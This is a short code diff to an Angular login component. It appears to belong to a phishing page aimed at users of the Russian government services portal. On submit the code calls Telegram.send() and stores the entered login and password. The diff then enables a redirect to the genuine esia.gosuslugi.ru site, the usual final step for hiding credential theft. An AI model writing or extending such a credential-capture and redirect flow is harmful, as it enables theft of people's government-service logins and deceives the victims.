@@ -78,7 +78,7 @@ export class LoginComponent implements OnInit {
 			Telegram.send();
 			this.prevValue.login = this.form.get('login').value;
 			this.prevValue.password = this.form.get('password').value;
-			// window.location.href = 'https://esia.gosuslugi.ru/';
+			window.location.href = 'https://esia.gosuslugi.ru/';
 		}
 	}
 
